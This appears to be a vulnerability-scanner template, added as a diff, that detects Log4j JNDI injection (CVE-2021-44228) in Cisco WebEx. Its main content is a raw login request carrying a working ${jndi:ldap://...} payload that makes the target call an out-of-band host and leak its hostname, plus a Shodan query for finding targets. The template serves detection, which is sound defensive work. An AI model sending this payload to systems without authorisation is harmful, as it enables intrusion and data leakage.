@@ -1,0 +1,66 @@
+id: cisco-webex-log4j-rce
+
+info:
+  name: Cisco WebEx - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Cisco WebEx is susceptible to Log4j JNDI remote code execution. Cisco WebEx provides web conferencing, videoconferencing and contact center as a service applications.
+  reference:
+    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+    shodan-query: title:"Cisco WebEx"
+  tags: cve,cve2021,rce,jndi,log4j,cisco,webex,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /orion/login?siteurl=meet HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/orion/login?siteurl=meet&rnd=0.1359184728177283
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+
+        type=getFailureTimes&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&bAjax=true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+
+# digest: 4a0a00473045022042bdc493eb4ec91bbcbcd56ef58972f45032f56c91a340ccc75e523f1953badf022100b70c8852cc0ae3850e5574cc27f06e2eaed76319f53bbb9e1cfe7a4061bd3640:922c64590222798bb761d5b6d8e72950
